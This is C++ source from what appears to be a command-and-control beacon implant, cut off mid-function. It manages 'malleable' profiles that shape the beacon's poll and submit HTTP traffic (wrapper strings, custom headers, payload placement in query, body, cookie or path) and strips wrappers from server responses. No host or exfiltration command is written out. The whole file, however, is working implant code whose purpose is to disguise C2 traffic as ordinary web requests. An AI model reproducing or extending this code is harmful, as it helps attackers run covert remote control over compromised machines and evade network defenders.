// -- Malleable C2 profile configuration management -----------------------
// Split into poll (GET) and submit (POST) profiles, each with their own
// wrapper, headers, payload location, and response unwrapping config.
#include "../../include/network/net_abstract.h"
#include "../../include/network/net_internal.h"
#include "../../include/utils.h"

// ===========================================================================
// POLL-direction (GET request) malleable config
// ===========================================================================
static bool    g_poll_set = false;
static char*   g_poll_wrapper_prefix = nullptr;
static char*   g_poll_wrapper_suffix = nullptr;
static uint8_t g_poll_wrapper_prefix_len = 0;
static uint8_t g_poll_wrapper_suffix_len = 0;

struct HTTP_header_node {
    HTTP_header_node* next;
    char*   name;
    uint8_t name_len;
    char*   value;
    uint8_t value_len;
};
static HTTP_header_node* g_poll_custom_headers = nullptr;
static uint8_t           g_poll_custom_header_count = 0;

static PCFG_LOCATION_TYPE g_poll_payload_location_type = PCFG_LOCATION_TYPE::QUERY_PARAM;
static char*   g_poll_payload_param_name = nullptr;
static uint8_t g_poll_payload_param_name_len = 0;
static char*   g_poll_cookie_name = nullptr;
static uint8_t g_poll_cookie_name_len = 0;
static char*   g_poll_path_prefix = nullptr;
static char*   g_poll_path_suffix = nullptr;
static uint8_t g_poll_path_prefix_len = 0;
static uint8_t g_poll_path_suffix_len = 0;

// ===========================================================================
// SUBMIT-direction (POST request) malleable config
// ===========================================================================
static bool    g_submit_set = false;
static char*   g_submit_wrapper_prefix = nullptr;
static char*   g_submit_wrapper_suffix = nullptr;
static uint8_t g_submit_wrapper_prefix_len = 0;
static uint8_t g_submit_wrapper_suffix_len = 0;

static HTTP_header_node* g_submit_custom_headers = nullptr;
static uint8_t           g_submit_custom_header_count = 0;

static PCFG_LOCATION_TYPE g_submit_payload_location_type = PCFG_LOCATION_TYPE::BODY;
static char*   g_submit_payload_param_name = nullptr;
static uint8_t g_submit_payload_param_name_len = 0;
static char*   g_submit_cookie_name = nullptr;
static uint8_t g_submit_cookie_name_len = 0;
static char*   g_submit_path_prefix = nullptr;
static char*   g_submit_path_suffix = nullptr;
static uint8_t g_submit_path_prefix_len = 0;
static uint8_t g_submit_path_suffix_len = 0;

// ===========================================================================
// POLL-response (S2B) malleable config — used by getMessage() to unwrap
// ===========================================================================
static bool    g_poll_response_set = false;
static char*   g_poll_response_wrapper_prefix = nullptr;
static char*   g_poll_response_wrapper_suffix = nullptr;
static uint8_t g_poll_response_wrapper_prefix_len = 0;
static uint8_t g_poll_response_wrapper_suffix_len = 0;
static char*   g_poll_response_cookie_name = nullptr;
static uint8_t g_poll_response_cookie_name_len = 0;

// ===========================================================================
// SUBMIT-response (S2B) malleable config — currently unused by beacon
// (submit responses are discarded), kept for symmetry with server config.
// ===========================================================================
static bool    g_submit_response_set = false;
static char*   g_submit_response_wrapper_prefix = nullptr;
static char*   g_submit_response_wrapper_suffix = nullptr;
static uint8_t g_submit_response_wrapper_prefix_len = 0;
static uint8_t g_submit_response_wrapper_suffix_len = 0;
static char*   g_submit_response_cookie_name = nullptr;
static uint8_t g_submit_response_cookie_name_len = 0;

// ===========================================================================
// POLL getters
// ===========================================================================

bool isPollSet(void) { return g_poll_set; }

const char* getPollWrapperPrefix(void) {
    return g_poll_wrapper_prefix ? g_poll_wrapper_prefix : "";
}
const char* getPollWrapperSuffix(void) {
    return g_poll_wrapper_suffix ? g_poll_wrapper_suffix : "";
}

const char* getPollCustomHTTPHeader(uint8_t index, uint16_t* name_len, uint16_t* value_len) {
    HTTP_header_node* cur = g_poll_custom_headers;
    uint8_t i = 0;
    while (cur && i < index) { cur = cur->next; i++; }
    if (!cur) { if (name_len) *name_len = 0; if (value_len) *value_len = 0; return NULL; }
    if (name_len) *name_len = cur->name_len;
    if (value_len) *value_len = cur->value_len;
    return cur->name;
}
const char* getPollCustomHeaderValue(uint8_t index) {
    HTTP_header_node* cur = g_poll_custom_headers;
    uint8_t i = 0;
    while (cur && i < index) { cur = cur->next; i++; }
    return cur ? cur->value : NULL;
}
uint8_t getPollCustomHTTPHeaderCount(void) { return g_poll_custom_header_count; }

PCFG_LOCATION_TYPE getPollPayloadLocationType(void) { return g_poll_payload_location_type; }
const char* getPollPayloadParamName(void) { return g_poll_payload_param_name ? g_poll_payload_param_name : ""; }
const char* getPollCookieName(void) { return g_poll_cookie_name ? g_poll_cookie_name : ""; }
uint8_t getPollCookieNameLen(void) { return g_poll_cookie_name_len; }
const char* getPollPathPrefix(void) { return g_poll_path_prefix ? g_poll_path_prefix : ""; }
const char* getPollPathSuffix(void) { return g_poll_path_suffix ? g_poll_path_suffix : ""; }

// ===========================================================================
// SUBMIT getters
// ===========================================================================

bool isSubmitSet(void) { return g_submit_set; }

const char* getSubmitWrapperPrefix(void) {
    return g_submit_wrapper_prefix ? g_submit_wrapper_prefix : "";
}
const char* getSubmitWrapperSuffix(void) {
    return g_submit_wrapper_suffix ? g_submit_wrapper_suffix : "";
}

const char* getSubmitCustomHTTPHeader(uint8_t index, uint16_t* name_len, uint16_t* value_len) {
    HTTP_header_node* cur = g_submit_custom_headers;
    uint8_t i = 0;
    while (cur && i < index) { cur = cur->next; i++; }
    if (!cur) { if (name_len) *name_len = 0; if (value_len) *value_len = 0; return NULL; }
    if (name_len) *name_len = cur->name_len;
    if (value_len) *value_len = cur->value_len;
    return cur->name;
}
const char* getSubmitCustomHeaderValue(uint8_t index) {
    HTTP_header_node* cur = g_submit_custom_headers;
    uint8_t i = 0;
    while (cur && i < index) { cur = cur->next; i++; }
    return cur ? cur->value : NULL;
}
uint8_t getSubmitCustomHTTPHeaderCount(void) { return g_submit_custom_header_count; }

PCFG_LOCATION_TYPE getSubmitPayloadLocationType(void) { return g_submit_payload_location_type; }
const char* getSubmitPayloadParamName(void) { return g_submit_payload_param_name ? g_submit_payload_param_name : ""; }
const char* getSubmitCookieName(void) { return g_submit_cookie_name ? g_submit_cookie_name : ""; }
uint8_t getSubmitCookieNameLen(void) { return g_submit_cookie_name_len; }
const char* getSubmitPathPrefix(void) { return g_submit_path_prefix ? g_submit_path_prefix : ""; }
const char* getSubmitPathSuffix(void) { return g_submit_path_suffix ? g_submit_path_suffix : ""; }

// ===========================================================================
// POLL-response getters
// ===========================================================================

bool isPollResponseSet(void) { return g_poll_response_set; }
const char* getPollResponseWrapperPrefix(void) {
    return g_poll_response_wrapper_prefix ? g_poll_response_wrapper_prefix : "";
}
const char* getPollResponseWrapperSuffix(void) {
    return g_poll_response_wrapper_suffix ? g_poll_response_wrapper_suffix : "";
}
const char* getPollResponseCookieName(void) {
    return g_poll_response_cookie_name ? g_poll_response_cookie_name : "";
}

// ===========================================================================
// SUBMIT-response getters (unused by beacon, for server symmetry)
// ===========================================================================

bool isSubmitResponseSet(void) { return g_submit_response_set; }
const char* getSubmitResponseWrapperPrefix(void) {
    return g_submit_response_wrapper_prefix ? g_submit_response_wrapper_prefix : "";
}
const char* getSubmitResponseWrapperSuffix(void) {
    return g_submit_response_wrapper_suffix ? g_submit_response_wrapper_suffix : "";
}
const char* getSubmitResponseCookieName(void) {
    return g_submit_response_cookie_name ? g_submit_response_cookie_name : "";
}

// ===========================================================================
// Free a single HTTP_header_node chain
// ===========================================================================
static void freeHeaderChain(HTTP_header_node*& head, uint8_t& count) {
    HTTP_header_node* cur = head;
    while (cur) {
        HTTP_header_node* next = cur->next;
        if (cur->name) __free(cur->name);
        if (cur->value) __free(cur->value);
        __free(cur);
        cur = next;
    }
    head = nullptr;
    count = 0;
}

// ===========================================================================
// Clear all malleable state
// ===========================================================================

static void freePollGlobals() {
    if (g_poll_wrapper_prefix) { __free(g_poll_wrapper_prefix); g_poll_wrapper_prefix = nullptr; }
    if (g_poll_wrapper_suffix) { __free(g_poll_wrapper_suffix); g_poll_wrapper_suffix = nullptr; }
    g_poll_wrapper_prefix_len = 0;
    g_poll_wrapper_suffix_len = 0;
    freeHeaderChain(g_poll_custom_headers, g_poll_custom_header_count);
    if (g_poll_payload_param_name) { __free(g_poll_payload_param_name); g_poll_payload_param_name = nullptr; }
    if (g_poll_cookie_name) { __free(g_poll_cookie_name); g_poll_cookie_name = nullptr; }
    if (g_poll_path_prefix) { __free(g_poll_path_prefix); g_poll_path_prefix = nullptr; }
    if (g_poll_path_suffix) { __free(g_poll_path_suffix); g_poll_path_suffix = nullptr; }
    g_poll_payload_param_name_len = 0;
    g_poll_cookie_name_len = 0;
    g_poll_path_prefix_len = 0;
    g_poll_path_suffix_len = 0;
    g_poll_payload_location_type = PCFG_LOCATION_TYPE::QUERY_PARAM;
    g_poll_set = false;
}

static void freeSubmitGlobals() {
    if (g_submit_wrapper_prefix) { __free(g_submit_wrapper_prefix); g_submit_wrapper_prefix = nullptr; }
    if (g_submit_wrapper_suffix) { __free(g_submit_wrapper_suffix); g_submit_wrapper_suffix = nullptr; }
    g_submit_wrapper_prefix_len = 0;
    g_submit_wrapper_suffix_len = 0;
    freeHeaderChain(g_submit_custom_headers, g_submit_custom_header_count);
    if (g_submit_payload_param_name) { __free(g_submit_payload_param_name); g_submit_payload_param_name = nullptr; }
    if (g_submit_cookie_name) { __free(g_submit_cookie_name); g_submit_cookie_name = nullptr; }
    if (g_submit_path_prefix) { __free(g_submit_path_prefix); g_submit_path_prefix = nullptr; }
    if (g_submit_path_suffix) { __free(g_submit_path_suffix); g_submit_path_suffix = nullptr; }
    g_submit_payload_param_name_len = 0;
    g_submit_cookie_name_len = 0;
    g_submit_path_prefix_len = 0;
    g_submit_path_suffix_len = 0;
    g_submit_payload_location_type = PCFG_LOCATION_TYPE::BODY;
    g_submit_set = false;
}

static void freePollResponseGlobals() {
    if (g_poll_response_wrapper_prefix) { __free(g_poll_response_wrapper_prefix); g_poll_response_wrapper_prefix = nullptr; }
    if (g_poll_response_wrapper_suffix) { __free(g_poll_response_wrapper_suffix); g_poll_response_wrapper_suffix = nullptr; }
    if (g_poll_response_cookie_name) { __free(g_poll_response_cookie_name); g_poll_response_cookie_name = nullptr; }
    g_poll_response_wrapper_prefix_len = 0;
    g_poll_response_wrapper_suffix_len = 0;
    g_poll_response_cookie_name_len = 0;
    g_poll_response_set = false;
}

static void freeSubmitResponseGlobals() {
    if (g_submit_response_wrapper_prefix) { __free(g_submit_response_wrapper_prefix); g_submit_response_wrapper_prefix = nullptr; }
    if (g_submit_response_wrapper_suffix) { __free(g_submit_response_wrapper_suffix); g_submit_response_wrapper_suffix = nullptr; }
    if (g_submit_response_cookie_name) { __free(g_submit_response_cookie_name); g_submit_response_cookie_name = nullptr; }
    g_submit_response_wrapper_prefix_len = 0;
    g_submit_response_wrapper_suffix_len = 0;
    g_submit_response_cookie_name_len = 0;
    g_submit_response_set = false;
}

// ===========================================================================
// Apply from a PCFG_ChannelMalleable to POLL globals
// ===========================================================================

static void applyPollMalleableFrom(const PCFG_ChannelMalleable* cm) {
    if (!cm) return;
    freePollGlobals();
    g_poll_set = true;

    if (cm->wrapper_prefix && cm->wrapper_prefix_len > 0) {
        g_poll_wrapper_prefix = (char*)__malloc(cm->wrapper_prefix_len + 1);
        if (g_poll_wrapper_prefix) {
            __memcpy(g_poll_wrapper_prefix, cm->wrapper_prefix, cm->wrapper_prefix_len);
            g_poll_wrapper_prefix[cm->wrapper_prefix_len] = '\0';
        }
    }
    g_poll_wrapper_prefix_len = cm->wrapper_prefix_len;

    if (cm->wrapper_suffix && cm->wrapper_suffix_len > 0) {
        g_poll_wrapper_suffix = (char*)__malloc(cm->wrapper_suffix_len + 1);
        if (g_poll_wrapper_suffix) {
            __memcpy(g_poll_wrapper_suffix, cm->wrapper_suffix, cm->wrapper_suffix_len);
            g_poll_wrapper_suffix[cm->wrapper_suffix_len] = '\0';
        }
    }
    g_poll_wrapper_suffix_len = cm->wrapper_suffix_len;

    c_debugPrint(g_state.nt, "Poll wrapper: prefix='%s' suffix='%s'",
                 g_poll_wrapper_prefix ? g_poll_wrapper_prefix : "",
                 g_poll_wrapper_suffix ? g_poll_wrapper_suffix : "");

    // Copy HTTP headers
    const HTTP_header* cfgHdr = cm->headers;
    HTTP_header_node* tail = nullptr;
    g_poll_custom_header_count = 0;
    while (cfgHdr && g_poll_custom_header_count < 255) {
        HTTP_header_node* node = (HTTP_header_node*)__malloc(sizeof(HTTP_header_node));
        if (!node) break;
        node->next = nullptr;
        if (cfgHdr->header && cfgHdr->headerLen > 0) {
            node->name = (char*)__malloc(cfgHdr->headerLen + 1);
            if (node->name) { __memcpy(node->name, cfgHdr->header, cfgHdr->headerLen); node->name[cfgHdr->headerLen] = '\0'; }
        } else { node->name = nullptr; }
        node->name_len = cfgHdr->headerLen;
        if (cfgHdr->value && cfgHdr->valueLen > 0) {
            node->value = (char*)__malloc(cfgHdr->valueLen + 1);
            if (node->value) { __memcpy(node->value, cfgHdr->value, cfgHdr->valueLen); node->value[cfgHdr->valueLen] = '\0'; }
        } else { node->value = nullptr; }
        node->value_len = cfgHdr->valueLen;
        c_debugPrint(g_state.nt, "Poll header %u: %s: %s", (unsigned)g_poll_custom_header_count,
                     node->name ? node->name : "(null)", node->value ? node->value : "(null)");
        if (!g_poll_custom_headers) { g_poll_custom_headers = node; tail = node; }
        else { tail->next = node; tail = node; }
        g_poll_custom_header_count++;
        cfgHdr = cfgHdr->next;
    }

    g_poll_payload_location_type = cm->payload_location.type;

    if (cm->payload_location.param_name && cm->payload_location.param_name_len > 0) {
        g_poll_payload_param_name = (char*)__malloc(cm->payload_location.param_name_len + 1);
        if (g_poll_payload_param_name) {
            __memcpy(g_poll_payload_param_name, cm->payload_location.param_name, cm->payload_location.param_name_len);
            g_poll_payload_param_name[cm->payload_location.param_name_len] = '\0';
        }
    }
    g_poll_payload_param_name_len = cm->payload_location.param_name_len;

    if (cm->payload_location.cookie_name && cm->payload_location.cookie_name_len > 0) {
        g_poll_cookie_name = (char*)__malloc(cm->payload_location.cookie_name_len + 1);
        if (g_poll_cookie_name) {
            __memcpy(g_poll_cookie_name, cm->payload_location.cookie_name, cm->payload_location.cookie_name_len);
            g_poll_cookie_name[cm->payload_location.cookie_name_len] = '\0';
        }
    }
    g_poll_cookie_name_len = cm->payload_location.cookie_name_len;

    if (cm->payload_location.path_prefix && cm->payload_location.path_prefix_len > 0) {
        g_poll_path_prefix = (char*)__malloc(cm->payload_location.path_prefix_len + 1);
        if (g_poll_path_prefix) {
            __memcpy(g_poll_path_prefix, cm->payload_location.path_prefix, cm->payload_location.path_prefix_len);
            g_poll_path_prefix[cm->payload_location.path_prefix_len] = '\0';
        }
    }
    g_poll_path_prefix_len = cm->payload_location.path_prefix_len;

    if (cm->payload_location.path_suffix && cm->payload_location.path_suffix_len > 0) {
        g_poll_path_suffix = (char*)__malloc(cm->payload_location.path_suffix_len + 1);
        if (g_poll_path_suffix) {
            __memcpy(g_poll_path_suffix, cm->payload_location.path_suffix, cm->payload_location.path_suffix_len);
            g_poll_path_suffix[cm->payload_location.path_suffix_len] = '\0';
        }
    }
    g_poll_path_suffix_len = cm->payload_location.path_suffix_len;

    c_debugPrint(g_state.nt, "Poll location type=%u param='%s'",
                 (unsigned)g_poll_payload_location_type,
                 g_poll_payload_param_name ? g_poll_payload_param_name : "");
}

// ===========================================================================
// Apply from a PCFG_ChannelMalleable to SUBMIT globals
// ===========================================================================

static void applySubmitMalleableFrom(const PCFG_ChannelMalleable* cm) {
    if (!cm) return;
    freeSubmitGlobals();
    g_submit_set = true;

    if (cm->wrapper_prefix && cm->wrapper_prefix_len > 0) {
        g_submit_wrapper_prefix = (char*)__malloc(cm->wrapper_prefix_len + 1);
        if (g_submit_wrapper_prefix) {
            __memcpy(g_submit_wrapper_prefix, cm->wrapper_prefix, cm->wrapper_prefix_len);
            g_submit_wrapper_prefix[cm->wrapper_prefix_len] = '\0';
        }
    }
    g_submit_wrapper_prefix_len = cm->wrapper_prefix_len;

    if (cm->wrapper_suffix && cm->wrapper_suffix_len > 0) {
        g_submit_wrapper_suffix = (char*)__malloc(cm->wrapper_suffix_len + 1);
        if (g_submit_wrapper_suffix) {
            __memcpy(g_submit_wrapper_suffix, cm->wrapper_suffix, cm->wrapper_suffix_len);
            g_submit_wrapper_suffix[cm->wrapper_suffix_len] = '\0';
        }
    }
    g_submit_wrapper_suffix_len = cm->wrapper_suffix_len;

    c_debugPrint(g_state.nt, "Submit wrapper: prefix='%s' suffix='%s'",
                 g_submit_wrapper_prefix ? g_submit_wrapper_prefix : "",
                 g_submit_wrapper_suffix ? g_submit_wrapper_suffix : "");

    const HTTP_header* cfgHdr = cm->headers;
    HTTP_header_node* tail = nullptr;
    g_submit_custom_header_count = 0;
    while (cfgHdr && g_submit_custom_header_count < 255) {
        HTTP_header_node* node = (HTTP_header_node*)__malloc(sizeof(HTTP_header_node));
        if (!node) break;
        node->next = nullptr;
        if (cfgHdr->header && cfgHdr->headerLen > 0) {
            node->name = (char*)__malloc(cfgHdr->headerLen + 1);
            if (node->name) { __memcpy(node->name, cfgHdr->header, cfgHdr->headerLen); node->name[cfgHdr->headerLen] = '\0'; }
        } else { node->name = nullptr; }
        node->name_len = cfgHdr->headerLen;
        if (cfgHdr->value && cfgHdr->valueLen > 0) {
            node->value = (char*)__malloc(cfgHdr->valueLen + 1);
            if (node->value) { __memcpy(node->value, cfgHdr->value, cfgHdr->valueLen); node->value[cfgHdr->valueLen] = '\0'; }
        } else { node->value = nullptr; }
        node->value_len = cfgHdr->valueLen;
        c_debugPrint(g_state.nt, "Submit header %u: %s: %s", (unsigned)g_submit_custom_header_count,
                     node->name ? node->name : "(null)", node->value ? node->value : "(null)");
        if (!g_submit_custom_headers) { g_submit_custom_headers = node; tail = node; }
        else { tail->next = node; tail = node; }
        g_submit_custom_header_count++;
        cfgHdr = cfgHdr->next;
    }

    g_submit_payload_location_type = cm->payload_location.type;

    if (cm->payload_location.param_name && cm->payload_location.param_name_len > 0) {
        g_submit_payload_param_name = (char*)__malloc(cm->payload_location.param_name_len + 1);
        if (g_submit_payload_param_name) {
            __memcpy(g_submit_payload_param_name, cm->payload_location.param_name, cm->payload_location.param_name_len);
            g_submit_payload_param_name[cm->payload_location.param_name_len] = '\0';
        }
    }
    g_submit_payload_param_name_len = cm->payload_location.param_name_len;

    if (cm->payload_location.cookie_name && cm->payload_location.cookie_name_len > 0) {
        g_submit_cookie_name = (char*)__malloc(cm->payload_location.cookie_name_len + 1);
        if (g_submit_cookie_name) {
            __memcpy(g_submit_cookie_name, cm->payload_location.cookie_name, cm->payload_location.cookie_name_len);
            g_submit_cookie_name[cm->payload_location.cookie_name_len] = '\0';
        }
    }
    g_submit_cookie_name_len = cm->payload_location.cookie_name_len;

    if (cm->payload_location.path_prefix && cm->payload_location.path_prefix_len > 0) {
        g_submit_path_prefix = (char*)__malloc(cm->payload_location.path_prefix_len + 1);
        if (g_submit_path_prefix) {
            __memcpy(g_submit_path_prefix, cm->payload_location.path_prefix, cm->payload_location.path_prefix_len);
            g_submit_path_prefix[cm->payload_location.path_prefix_len] = '\0';
        }
    }
    g_submit_path_prefix_len = cm->payload_location.path_prefix_len;

    if (cm->payload_location.path_suffix && cm->payload_location.path_suffix_len > 0) {
        g_submit_path_suffix = (char*)__malloc(cm->payload_location.path_suffix_len + 1);
        if (g_submit_path_suffix) {
            __memcpy(g_submit_path_suffix, cm->payload_location.path_suffix, cm->payload_location.path_suffix_len);
            g_submit_path_suffix[cm->payload_location.path_suffix_len] = '\0';
        }
    }
    g_submit_path_suffix_len = cm->payload_location.path_suffix_len;

    c_debugPrint(g_state.nt, "Submit location type=%u param='%s'",
                 (unsigned)g_submit_payload_location_type,
                 g_submit_payload_param_name ? g_submit_payload_param_name : "");
}

// ===========================================================================
// Apply response malleable for poll responses
// ===========================================================================

static void applyPollResponseMalleableFrom(const PCFG_ChannelMalleable* cm) {
    if (!cm) return;
    freePollResponseGlobals();
    g_poll_response_set = true;

    if (cm->wrapper_prefix && cm->wrapper_prefix_len > 0) {
        g_poll_response_wrapper_prefix = (char*)__malloc(cm->wrapper_prefix_len + 1);
        if (g_poll_response_wrapper_prefix) {
            __memcpy(g_poll_response_wrapper_prefix, cm->wrapper_prefix, cm->wrapper_prefix_len);
            g_poll_response_wrapper_prefix[cm->wrapper_prefix_len] = '\0';
        }
    }
    g_poll_response_wrapper_prefix_len = cm->wrapper_prefix_len;

    if (cm->wrapper_suffix && cm->wrapper_suffix_len > 0) {
        g_poll_response_wrapper_suffix = (char*)__malloc(cm->wrapper_suffix_len + 1);
        if (g_poll_response_wrapper_suffix) {
            __memcpy(g_poll_response_wrapper_suffix, cm->wrapper_suffix, cm->wrapper_suffix_len);
            g_poll_response_wrapper_suffix[cm->wrapper_suffix_len] = '\0';
        }
    }
    g_poll_response_wrapper_suffix_len = cm->wrapper_suffix_len;

    if (cm->payload_location.cookie_name && cm->payload_location.cookie_name_len > 0) {
        g_poll_response_cookie_name = (char*)__malloc(cm->payload_location.cookie_name_len + 1);
        if (g_poll_response_cookie_name) {
            __memcpy(g_poll_response_cookie_name, cm->payload_location.cookie_name, cm->payload_location.cookie_name_len);
            g_poll_response_cookie_name[cm->payload_location.cookie_name_len] = '\0';
        }
    }
    g_poll_response_cookie_name_len = cm->payload_location.cookie_name_len;

    c_debugPrint(g_state.nt, "Poll response wrapper: prefix='%s' suffix='%s' cookie='%s'",
                 g_poll_response_wrapper_prefix ? g_poll_response_wrapper_prefix : "",
                 g_poll_response_wrapper_suffix ? g_poll_response_wrapper_suffix : "",
                 g_poll_response_cookie_name ? g_poll_response_cookie_name : "");
}

// ===========================================================================
// Apply response malleable for submit responses
// ===========================================================================

static void applySubmitResponseMalleableFrom(const PCFG_ChannelMalleable* cm) {
    if (!cm) return;
    freeSubmitResponseGlobals();
    g_submit_response_set = true;

    if (cm->wrapper_prefix && cm->wrapper_prefix_len > 0) {
        g_submit_response_wrapper_prefix = (char*)__malloc(cm->wrapper_prefix_len + 1);
        if (g_submit_response_wrapper_prefix) {
            __memcpy(g_submit_response_wrapper_prefix, cm->wrapper_prefix, cm->wrapper_prefix_len);
            g_submit_response_wrapper_prefix[cm->wrapper_prefix_len] = '\0';
        }
    }
    g_submit_response_wrapper_prefix_len = cm->wrapper_prefix_len;

    if (cm->wrapper_suffix && cm->wrapper_suffix_len > 0) {
        g_submit_response_wrapper_suffix = (char*)__malloc(cm->wrapper_suffix_len + 1);
        if (g_submit_response_wrapper_suffix) {
            __memcpy(g_submit_response_wrapper_suffix, cm->wrapper_suffix, cm->wrapper_suffix_len);
            g_submit_response_wrapper_suffix[cm->wrapper_suffix_len] = '\0';
        }
    }
    g_submit_response_wrapper_suffix_len = cm->wrapper_suffix_len;

    if (cm->payload_location.cookie_name && cm->payload_location.cookie_name_len > 0) {
        g_submit_response_cookie_name = (char*)__malloc(cm->payload_location.cookie_name_len + 1);
        if (g_submit_response_cookie_name) {
            __memcpy(g_submit_response_cookie_name, cm->payload_location.cookie_name, cm->payload_location.cookie_name_len);
            g_submit_response_cookie_name[cm->payload_location.cookie_name_len] = '\0';
        }
    }
    g_submit_response_cookie_name_len = cm->payload_location.cookie_name_len;

    c_debugPrint(g_state.nt, "Submit response wrapper: prefix='%s' suffix='%s' cookie='%s'",
                 g_submit_response_wrapper_prefix ? g_submit_response_wrapper_prefix : "",
                 g_submit_response_wrapper_suffix ? g_submit_response_wrapper_suffix : "",
                 g_submit_response_cookie_name ? g_submit_response_cookie_name : "");
}

// ===========================================================================
// Unwrap a poll server response by stripping prefix/suffix
// ===========================================================================

const char* unwrapPollResponseBuffer(const char* rawResponse, size_t rawLen, size_t* outLen) {
    if (!rawResponse || rawLen == 0 || !outLen) {
        if (outLen) *outLen = 0;
        return rawResponse;
    }

    if (!g_poll_response_set) {
        *outLen = rawLen;
        return rawResponse;
    }

    const char* payloadStart = rawResponse;
    size_t payloadLen = rawLen;

    size_t prefixLen = g_poll_response_wrapper_prefix_len;
    if (prefixLen > 0 && payloadLen >= prefixLen) {
        if (__memcmp(payloadStart, g_poll_response_wrapper_prefix, prefixLen) == 0) {
            payloadStart += prefixLen;
            payloadLen -= prefixLen;
        }
    }

    size_t suffixLen = g_poll_response_wrapper_suffix_len;
    if (suffixLen > 0 && payloadLen >= suffixLen) {
        if (__memcmp(payloadStart + payloadLen - suffixLen, g_poll_response_wrapper_suffix, suffixLen) == 0) {
            payloadLen -= suffixLen;
        }
    }

    *outLen = payloadLen;
    return payloadStart;
}

// ===========================================================================
// Set malleable config from parsed BeaconConfig (global + per-channel)
// ===========================================================================

void setMalleableConfigFromBeaconConfig(const void* beaconConfig) {
    if (!beaconConfig) {
        c_debugPrint(g_state.nt, "[setMalleableConfigFromBeaconConfig] beaconConfig is NULL!");
        return;
    }

    const BeaconConfig* cfg = static_cast<const BeaconConfig*>(beaconConfig);
    c_debugPrint(g_state.nt, "[setMalleableConfigFromBeaconConfig] poll=%u submit=%u poll_resp=%u submit_resp=%u",
                 (unsigned)cfg->has_poll_malleable_config,
                 (unsigned)cfg->has_submit_malleable_config,
                 (unsigned)cfg->has_poll_response_malleable_config,
                 (unsigned)cfg->has_submit_response_malleable_config);

    // Poll request
    if (cfg->has_poll_malleable_config) {
        applyPollMalleableFrom(&cfg->global_poll_malleable);
    } else {
        freePollGlobals();
    }

    // Submit request
    if (cfg->has_submit_malleable_config) {
        applySubmitMalleableFrom(&cfg->global_submit_malleable);
    } else {
        freeSubmitGlobals();
    }

    // Poll response
    if (cfg->has_poll_response_malleable_config) {
        applyPollResponseMalleableFrom(&cfg->global_poll_response_malleable);
    } else {
        freePollResponseGlobals();
    }

    // Submit response
    if (cfg->has_submit_response_malleable_config) {
        applySubmitResponseMalleableFrom(&cfg->global_submit_response_malleable);
    } else {
        freeSubmitResponseGlobals();
    }
}

// ===========================================================================
// Per-channel response malleable resolution (poll direction)
// ===========================================================================

void setPollResponseFromBeaconConfig(const void* beaconConfig, uint8_t channelIndex) {
    if (!beaconConfig) return;
    const BeaconConfig* cfg = static_cast<const BeaconConfig*>(beaconConfig);

    if (channelIndex < cfg->channel_count) {
        PCFG_MALLEABLE_MODE mode = cfg->channels[channelIndex].poll_response_malleable_mode;

        if (mode == PCFG_MALLEABLE_MODE::INLINE && cfg->channel_poll_response_malleable) {
            applyPollResponseMalleableFrom(&cfg->channel_poll_response_malleable[channelIndex]);
            return;
        }

        if (mode == PCFG_MALLEABLE_MODE::GLOBAL && cfg->has_poll_response_malleable_config) {
            applyPollResponseMalleableFrom(&cfg->global_poll_response_malleable);
            return;
        }
    }

    if (cfg->has_poll_response_malleable_config) {
        applyPollResponseMalleableFrom(&cfg->global_poll_response_malleable);
    } else {
        freePollResponseGlobals();
    }
}

// ===========================================================================
// Per-channel response malleable resolution (submit direction)
// ===========================================================================

void setSubmitResponseFromBeaconConfig(const void* beaconConfig, uint8_t channelIndex) {
    if (!beaconConfig) return;
    const BeaconConfig* cfg = static_cast<const BeaconConfig*>(beaconConfig);

    if (channelIndex < cfg->channel_count) {
        PCFG_MALLEABLE_MODE mode = cfg->channels[channelIndex].submit_response_malleable_mode;

        if (mode == PCFG_MALLEABLE_MODE::INLINE && cfg->channel_submit_response_malleable) {
            applySubmitResponseMalleableFrom(&cfg->channel_submit_response_malleable[channelIndex]);
            return;
        }

        if (mode == PCFG_MALLEABLE_MODE::GLOBAL && cfg->has_submit_response_malleable_config) {
            applySubmitResponseMalleableFrom(&cfg->global_submit_response_malleable);
            return;
        }
    }

    if (cfg->has_submit_response_malleable_config) {
        applySubmitResponseMalleableFrom(&cfg->global_submit_response_malleable);
    } else {
        freeSubmitResponseGlobals();
    }
}

// ===========================================================================
// Clear all malleable config state
// ===========================================================================

void clearMalleableConfig(void) {
    freePollGlobals();
    freeSubmitGlobals();
    freePollResponseGlobals();
    freeSubmitResponseGlobals();
    c_debugPrint(g_state.nt, "All malleable config cleared");
}

// ===========================================================================
// Set poll malleable from per-channel config
// ===========================================================================

void setPollMalleableFromChannelMalleable(const PCFG_ChannelMalleable* chMalleable) {
    if (!chMalleable) {
        freePollGlobals();
        return;
    }
    applyPollMalleableFrom(chMalleable);
}

// ===========================================================================
// Set submit malleable from per-channel config
// ===========================================================================

void setSubmitMalleableFromChannelMalleable(const PCFG_ChannelMalleable* chMalleable) {
    if (!chMalleable) {
        freeSubmitGlobals();
        return;
    }
    applySubmitMalleableFrom(chMalleable);
}

// ===========================================================================
// Per-channel poll malleable resolution
// ===========================================================================

void setPollMalleableFromBeaconConfig(const void* beaconConfig, uint8_t channelIndex) {
    if (!beaconConfig) return;
    const BeaconConfig* cfg = static_cast<const BeaconConfig*>(beaconConfig);

    if (channelIndex < cfg->channel_count) {
        PCFG_MALLEABLE_MODE mode = cfg->channels[channelIndex].poll_malleable_mode;

        if (mode == PCFG_MALLEABLE_MODE::INLINE && cfg->channel_poll_malleable) {
            applyPollMalleableFrom(&cfg->channel_poll_malleable[channelIndex]);
            return;
        }

        if (mode == PCFG_MALLEABLE_MODE::GLOBAL && cfg->has_poll_malleable_config) {
            applyPollMalleableFrom(&cfg->global_poll_malleable);
            return;
        }
    }

    if (cfg->has_poll_malleable_config) {
        applyPollMalleableFrom(&cfg->global_poll_malleable);
    } else {
        freePollGlobals();
    }
}

// ===========================================================================
// Per-channel submit malleable resolution
// ===========================================================================

void setSubmitMalleableFromBeaconConfig(const void* beaconConfig, uint8_t channelIndex) {
    if (!beaconConfig) return;
    const BeaconConfig* cfg = static_cast<const BeaconConfig*>(beaconConfig);

    if (channelIndex < cfg->channel_count) {
        PCFG_MALLEABLE_MODE mode = cfg->channels[channelIndex].submit_malleable_mode;

        if (mode == PCFG_MALLEABLE_MODE::INLINE && cfg->channel_submit_malleable) {
            applySubmitMalleableFrom(&cfg->channel_submit_malleable[channelIndex]);
            return;
        }

        if (mode == PCFG_MALLEABLE_MODE::GLOBAL && cfg->has_submit_malleable_config) {
            applySubmitMalleableFrom(&cfg->global_submit_malleable);
            return;
        }
    }

